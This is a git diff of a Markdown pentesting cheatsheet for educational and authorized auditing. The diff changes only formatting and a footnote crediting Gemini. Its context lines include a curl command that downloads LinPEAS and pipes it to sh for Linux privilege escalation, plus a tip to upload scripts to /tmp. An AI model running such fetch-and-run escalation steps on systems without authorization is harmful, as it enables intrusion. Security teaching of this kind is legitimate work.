@@ -1,4 +1,4 @@
-# Advanced Cybersecurity & Pentesting Cheatsheet
+#  Advanced Cybersecurity & Pentesting Cheatsheet
 
 > [!IMPORTANT]
 > This document is for educational and authorized security auditing purposes only.
@@ -79,7 +79,7 @@ If you are logged into a machine and don't know where the flags or sensitive dat
 
 ---
 
-## Phase 5: Privilege Escalation (Linux)
+##  Phase 5: Privilege Escalation (Linux)
 
 ### Automated Enumeration
 - **Download and Run LinPeas:** `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
@@ -102,4 +102,4 @@ If you are logged into a machine and don't know where the flags or sensitive dat
 | `/tmp` | Best place to upload scripts (usually executable) |
 
 ---
--Please Note that This File was made With the Help of the Gemini LLM for Teaching Purposes
+*Please Note that This File was made With the Help of Gemini for Teaching Purposes*
